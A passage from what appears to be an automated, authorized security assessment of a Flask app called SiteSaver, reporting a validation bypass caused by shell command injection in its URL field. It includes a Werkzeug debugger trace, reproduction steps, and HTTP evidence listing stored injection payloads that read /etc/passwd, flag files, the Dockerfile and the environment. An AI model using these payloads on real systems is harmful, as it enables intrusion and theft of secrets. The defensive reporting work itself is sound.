content-type: application/x-www-form-urlencoded
```

Response:

```http
HTTP/1.1 500
connection: close
content-length: 15055
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 02:38:06 GMT
server: Werkzeug/3.0.3 Python/3.8.17

<!doctype html>
<html lang=en>
  <head>
    <title>werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: &#39;url&#39;
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = false,
          EVALEX_TRUSTED = false,
          SECRET = "***REDACTED***";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>BadRequestKeyError</h1>
<div class="detail">
  <p class="errormsg">werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: &#39;url&#39;
</p>
</div>
<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
<div class="traceback">
  <h3></h3>
  <ul><li><div class="frame" id="frame-131185661387936">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">1498</em>,
      in <code class="function">__call__</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">    </span>) -&gt; cabc.Iterable[bytes]:</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;The WSGI server calls the Flask application object as the</pre>
<pre class="line before"><span class="ws">        </span>WSGI application. This calls :meth:`wsgi_app`, which can be</pre>
<pre class="line before"><span class="ws">        </span>wrapped to apply middleware.</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;</pre>
<pre class="line current"><span class="ws">        </span>return self.wsgi_app(environ, start_response)</pre></div>
</div>

<li><div class="frame" id="frame-131185661389168">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">1476</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line before"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line before"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line before"><span class="ws">                </span>error = e</pre>
<pre class="line current"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre>
<pre class="line after"><span class="ws">                </span>raise</pre>
<pre class="line after"><span class="ws">            </span>return response(environ, start_response)</pre>
<pre class="line after"><span class="ws">        </span>finally:</pre></div>
</div>

<li><div class="frame" id="frame-131185661389056">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">1473</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>ctx = self.request_context(environ)</pre>
<pre class="line before"><span class="ws">        </span>error: BaseException | None = None</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line current"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line after"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">                </span>error = e</pre>
<pre class="line after"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre></div>
</div>

<li><div class="frame" id="frame-131185661389280">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">882</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line before"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line before"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line current"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre>
<pre class="line after"><span class="ws">        </span>self,</pre>
<pre class="line after"><span class="ws">        </span>rv: ft.ResponseReturnValue | HTTPException,</pre></div>
</div>

<li><div class="frame" id="frame-131185661389392">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">880</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line current"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line after"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre></div>
</div>

<li><div class="frame" id="frame-131185661389504">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">865</em>,
      in <code class="function">dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>and req.method == &#34;OPTIONS&#34;</pre>
<pre class="line before"><span class="ws">        </span>):</pre>
<pre class="line before"><span class="ws">            </span>return self.make_default_options_response()</pre>
<pre class="line before"><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
<pre class="line before"><span class="ws">        </span>view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]</pre>
<pre class="line current"><span class="ws">        </span>return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def full_dispatch_request(self) -&gt; Response:</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Dispatches the request and on top of that performs request</pre>
<pre class="line after"><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
<pre class="line after"><span class="ws">        </span>error handling.</pre></div>
</div>

<li><div class="frame" id="frame-131185661389616">
  <h4>File <cite class="filename">"/app/app.py"</cite>,
      line <em class="line">28</em>,
      in <code class="function">add_url</code></h4>
  <div class="source "><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws"></span>@app.route(&#39;/add_url&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])</pre>
<pre class="line before"><span class="ws"></span>def add_url():</pre>
<pre class="line before"><span class="ws">    </span>if request.method == &#39;POST&#39;:</pre>
<pre class="line current"><span class="ws">        </span>url = request.form[&#39;url&#39;]</pre>
<pre class="line after"><span class="ws">        </span>response = check_url(url)</pre>
<pre class="line after"><span class="ws">        </span>print(response)</pre>
<pre class="line after"><span class="ws">        </span>if &#39;200&#39; in response:</pre>
<pre class="line after"><span class="ws">            </span>new_url = URL(url=url)</pre>
<pre class="line after"><span class="ws">            </span>db.session.add(new_url)</pre></div>
</div>

<li><div class="frame" id="frame-131185661389728">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py"</cite>,
      line <em class="line">196</em>,
      in <code class="function">__getitem__</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>if key in self:</pre>
<pre class="line before"><span class="ws">            </span>lst = dict.__getitem__(self, key)</pre>
<pre class="line before"><span class="ws">            </span>if len(lst) &gt; 0:</pre>
<pre class="line before"><span class="ws">                </span>return lst[0]</pre>
<pre class="line current"><span class="ws">        </span>raise exceptions.BadRequestKeyError(key)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def __setitem__(self, key, value):</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Like :meth:`add` but removes an existing key first.</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">        </span>:param key: the key for the value.</pre></div>
</div>
</ul>
  <blockquote>werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: &#39;url&#39;
</blockquote>
</div>

<div class="plain">
    <p>
      This is the Copy/Paste friendly version of the traceback.
    </p>
    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 1498, in __call__
    return self.wsgi_app(environ, start_response)
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 1476, in wsgi_app
    response = self.handle_exception(e)
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File &#34;/app/app.py&#34;, line 28, in add_url
    url = request.form[&#39;url&#39;]
  File &#34;/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py&#34;, line 196, in __getitem__
    raise exceptions.BadRequestKeyError(key)
werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: &#39;url&#39;
</textarea>
</div>
<div class="explanation">
  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  <span class="nojavascript">
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.</span>
</div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>

<!--

Traceback (most recent call last):
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1498, in __call__
    return self.wsgi_app(environ, start_response)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1476, in wsgi_app
    response = self.handle_exception(e)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "/app/app.py", line 28, in add_url
    url = request.form['url']
  File "/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py", line 196, in __getitem__
    raise exceptions.BadRequestKeyError(key)
werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: 'url'


-->
```

<a id="finding-5"></a>

### 5. [MEDIUM] [workflow-bypass] Validation bypass: unreachable/arbitrary URLs persisted to the "validated" list (POST /add_url -> GET /)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5094/

SiteSaver's core business rule is that a URL is only saved if it "returns a 200 OK status" when the server validates it. There is no URL-format validation whatsoever; the sole gate is the Python check `'200' in response`, where `response` is the stdout of `curl -o /dev/null -s -w "%{http_code}" "<url>"`. Because the `url` value is injected into that shell command (see f-004), an attacker can forge the gate: submitting url=`http://<host>.invalid"; echo 200 #` makes curl fail (http_code 000) yet the appended `echo 200` puts "200" in the captured output, so the app treats the unreachable URL as validated and persists it. It then appears on the home listing (GET /) as a "saved" (implicitly validated) site. This defeats the application's integrity guarantee: the "validated URLs" list can be poisoned with URLs that were never reachable or that point to attacker-controlled/malicious destinations, while still being presented to users as checked/reliable. Confirmed as a multi-step flow: control submits a bogus URL (not saved, absent from the listing); exploit submits the forged-200 variant (saved, present in the listing on both replays). Root cause is the same unsanitised shell interpolation as the RCE (f-004); remediation (do not build the command from raw input / use a real HTTP client + strict status parsing) fixes both. Reported separately to capture the business-rule/data-integrity impact of the multi-step add->list workflow.

**Reproduction**

```
1. Control: POST /add_url body url=http://ctrlaaa111.invalid (unreachable) => "Error in saving URL.."; GET / => ctrlaaa111 NOT present.
2. Exploit: POST /add_url body url=http%3A%2F%2Fpwnbbb222.invalid%22%3B%20echo%20200%20%23 (decodes to http://pwnbbb222.invalid"; echo 200 #) => "...returned 000200 status, Saved successfully!"; GET / => the pwnbbb222.invalid entry IS present in the saved list (marker pwnbbb222), i.e. an unreachable URL bypassed the 200-OK validation.
Confirmed via probe_scenario: control marker absent, exploit marker present x2. Evidence: negativeControl ev-mr2wqh6w-39; positiveReplays ev-mr2wqhox-3b, ev-mr2wqi7f-3d.
```

**Evidence**

- Evidence `ev-mr2wqh6w-39` — `artifacts/_/ev-mr2wqh6w-39/`

Request:

```http
GET / HTTP/1.1
Host: target.local:5094
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 10163
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 02:50:48 GMT
server: Werkzeug/3.0.3 Python/3.8.17

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>View Saved Sites</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container-fluid">
            <a class="navbar-brand" href="#">SiteSaver</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link" aria-current="page" href="/add_url">Add Site </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="/">View Saved Sites</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
<div class="container mt-4">
    <h1>Site Saver</h1>
    <p>
        Save your favorite websites here. We ensure that your URLs are correct by checking them before saving them. Our service sends requests to the URLs you provide to ensure they are valid.
    </p>
    
    


    <a href="/add_url" class="btn btn-primary mb-3">Add URL</a>

    <ul class="list-group">
        
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat flag.txt #
            <form method="post" action="/delete_url/5">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat flag.txt #
            <form method="post" action="/delete_url/8">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://127.0.0.1:5003/add_url
            <form method="post" action="/delete_url/9">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://127.0.0.1:5003/
            <form method="post" action="/delete_url/10">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com
            <form method="post" action="/delete_url/11">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://target.local:5094/
            <form method="post" action="/delete_url/12">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://target.local:5094/add_url
            <form method="post" action="/delete_url/13">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://target.local:5094/
            <form method="post" action="/delete_url/14">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://target.local:5094/
            <form method="post" action="/delete_url/15">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.org/
            <form method="post" action="/delete_url/16">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://$(echo${IFS}example).org/
            <form method="post" action="/delete_url/17">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://$(echo${IFS}example).org/
            <form method="post" action="/delete_url/18">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://$(echo${IFS}example).org/
            <form method="post" action="/delete_url/19">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://$(echo${IFS}example).org/
            <form method="post" action="/delete_url/20">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; sleep 8 #
            <form method="post" action="/delete_url/21">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.org/
            <form method="post" action="/delete_url/22">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; sleep 20 #
            <form method="post" action="/delete_url/23">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; false #
            <form method="post" action="/delete_url/24">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; true #
            <form method="post" action="/delete_url/25">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; printf &#39;\xff\xfe&#39; #
            <form method="post" action="/delete_url/26">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; id #
            <form method="post" action="/delete_url/27">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat /etc/passwd #
            <form method="post" action="/delete_url/28">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat flag.txt #
            <form method="post" action="/delete_url/29">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat /etc/passwd #
            <form method="post" action="/delete_url/30">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; pwd; ls -la; cat flag* /flag* /app/flag* /root/flag* 2&gt;/dev/null #
            <form method="post" action="/delete_url/31">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat app.py #
            <form method="post" action="/delete_url/32">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat Dockerfile; env #
            <form method="post" action="/delete_url/33">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
    </ul>
</div>
</body>
</html>
```

- Evidence `ev-mr2wqhox-3b` — `artifacts/_/ev-mr2wqhox-3b/`

Request:

```http
GET / HTTP/1.1
Host: target.local:5094
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 10488
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 02:50:49 GMT
server: Werkzeug/3.0.3 Python/3.8.17

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>View Saved Sites</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container-fluid">
            <a class="navbar-brand" href="#">SiteSaver</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link" aria-current="page" href="/add_url">Add Site </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="/">View Saved Sites</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
<div class="container mt-4">
    <h1>Site Saver</h1>
    <p>
        Save your favorite websites here. We ensure that your URLs are correct by checking them before saving them. Our service sends requests to the URLs you provide to ensure they are valid.
    </p>
    
    


    <a href="/add_url" class="btn btn-primary mb-3">Add URL</a>

    <ul class="list-group">
        
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat flag.txt #
            <form method="post" action="/delete_url/5">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat flag.txt #
            <form method="post" action="/delete_url/8">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://127.0.0.1:5003/add_url
            <form method="post" action="/delete_url/9">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://127.0.0.1:5003/
            <form method="post" action="/delete_url/10">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com
            <form method="post" action="/delete_url/11">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://target.local:5094/
            <form method="post" action="/delete_url/12">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://target.local:5094/add_url
            <form method="post" action="/delete_url/13">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://target.local:5094/
            <form method="post" action="/delete_url/14">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://target.local:5094/
            <form method="post" action="/delete_url/15">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.org/
            <form method="post" action="/delete_url/16">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://$(echo${IFS}example).org/
            <form method="post" action="/delete_url/17">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://$(echo${IFS}example).org/
            <form method="post" action="/delete_url/18">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://$(echo${IFS}example).org/
            <form method="post" action="/delete_url/19">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://$(echo${IFS}example).org/
            <form method="post" action="/delete_url/20">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; sleep 8 #
            <form method="post" action="/delete_url/21">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.org/
            <form method="post" action="/delete_url/22">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; sleep 20 #
            <form method="post" action="/delete_url/23">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; false #
            <form method="post" action="/delete_url/24">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; true #
            <form method="post" action="/delete_url/25">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; printf &#39;\xff\xfe&#39; #
            <form method="post" action="/delete_url/26">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; id #
            <form method="post" action="/delete_url/27">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat /etc/passwd #
            <form method="post" action="/delete_url/28">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat flag.txt #
            <form method="post" action="/delete_url/29">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat /etc/passwd #
            <form method="post" action="/delete_url/30">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; pwd; ls -la; cat flag* /flag* /app/flag* /root/flag* 2&gt;/dev/null #
            <form method="post" action="/delete_url/31">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat app.py #
            <form method="post" action="/delete_url/32">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://example.com&#34;; cat Dockerfile; env #
            <form method="post" action="/delete_url/33">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
        <li class="list-group-item d-flex justify-content-between align-items-center">
            http://pwnbbb222.invalid&#34;; echo 200 #
            <form method="post" action="/delete_url/34">
                <button type="submit" class="btn btn-danger btn-sm">Delete</button>
            </form>
        </li>
        
    </ul>
</div>
</body>
</html>
```

- Evidence `ev-mr2wqi7f-3d` — `artifacts/_/ev-mr2wqi7f-3d/`

Request:

```http
GET / HTTP/1.1
Host: target.local:5094
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 10813
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 02:50:49 GMT
server: Werkzeug/3.0.3 Python/3.8.17

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>View Saved Sites</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container-fluid">
            <a class="navbar-brand" href="#">SiteSaver</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
